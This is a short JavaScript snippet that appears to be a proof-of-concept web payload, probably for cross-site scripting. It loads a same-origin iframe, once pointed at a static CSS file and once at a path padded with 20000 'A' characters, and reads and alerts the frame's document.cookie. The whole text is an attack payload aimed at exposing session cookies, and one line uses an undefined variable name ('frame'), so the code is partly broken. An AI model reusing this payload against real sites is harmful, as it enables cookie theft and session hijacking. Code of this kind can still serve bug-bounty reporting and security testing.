const iframe = document.querySelector('.asd');
iframe.src="/css/bootstrap.min.css";
frame.src="/"+"A".repeat(20000);
iframe.addEventListener('load', () => {
  
  const childDocument = iframe.contentDocument || iframe.contentWindow.document;  
  const iframeWindow = iframe.contentWindow;
  iframeWindow.alert(iframe.contentWindow.document.cookie);		
});
